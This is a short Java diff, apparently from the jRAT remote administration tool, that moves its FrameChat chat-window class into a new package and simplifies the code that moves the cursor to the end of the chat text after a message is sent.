@@ -1,5 +1,7 @@
-package jrat.client;
+package jrat.module.chat;
 
+import jrat.client.Connection;
+import jrat.client.Nudge;
 import jrat.client.packets.outgoing.Packet35ChatMessage;
 
 import javax.swing.*;
@@ -83,8 +85,8 @@ public class FrameChat extends JFrame {
 				con.addToSendQueue(new Packet35ChatMessage(textField.getText().trim()));
 				txtChat.getDocument().insertString(txtChat.getDocument().getLength(), "You: " + textField.getText().trim() + "\n", set);
 				textField.setText("");
-				txtChat.setSelectionEnd(con.getFrameChat().txtChat.getText().length());
-				txtChat.setSelectionStart(con.getFrameChat().txtChat.getText().length());
+				txtChat.setSelectionEnd(txtChat.getText().length());
+				txtChat.setSelectionStart(txtChat.getText().length());
 			}
 		} catch (Exception ex) {
 			ex.printStackTrace();
